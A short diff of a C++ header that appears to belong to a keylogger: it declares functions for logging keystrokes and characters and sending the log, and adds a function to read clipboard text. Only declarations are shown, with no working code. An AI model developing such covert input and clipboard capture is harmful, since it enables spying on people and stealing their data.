@@ -19,5 +19,6 @@ public:
 	void LogItInt(int key_stroke);
 	void LogItChar(std::string Value);
 	void SendLog();
-
 };
+
+std::string GetClipBoardTxt();
